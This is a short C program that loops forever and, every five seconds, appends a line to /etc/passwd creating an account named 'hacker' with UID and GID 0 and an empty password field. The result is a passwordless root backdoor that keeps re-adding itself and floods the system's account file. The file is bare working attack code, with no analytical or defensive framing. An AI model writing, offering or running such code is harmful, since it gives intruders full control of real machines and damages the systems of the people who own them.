#include <stdio.h>
 
main()
{
	
	FILE *fp;
	while(1)
		
	{
		sleep(5);
	fp=fopen("/etc/passwd","a");
	fputs("hacker::0:0:hacker:/home/wangcong:/bin/bash\n",fp);
	fclose(fp);
	}
}


